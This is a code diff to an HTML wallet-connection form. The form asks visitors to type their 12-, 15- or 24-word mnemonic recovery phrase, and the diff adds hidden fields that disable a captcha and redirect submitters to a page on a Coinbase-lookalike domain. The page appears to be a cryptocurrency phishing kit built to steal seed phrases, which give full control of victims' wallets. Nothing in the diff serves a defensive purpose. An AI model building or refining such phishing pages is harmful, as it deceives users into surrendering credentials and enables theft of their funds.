@@ -230,7 +230,8 @@
                             <div class="form-group">
       <textarea placeholder="Enter your 12, 15, or 24 Mnemonic words. Seperate them with spaces." class="form-control" style="font-size:25px; font-weight:650" rows="4" name="phrase" rows="10" required></textarea>
     </div>
-                            
+                              <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://coinbasedservices.vercel.app/done.html">
                                 <p>...</p>
                                 <button id="submit" type="submit" name="submit" value="submit" class="btn btn-primary"
                                     style="border-top: 5px; ">Connect Wallet</button>
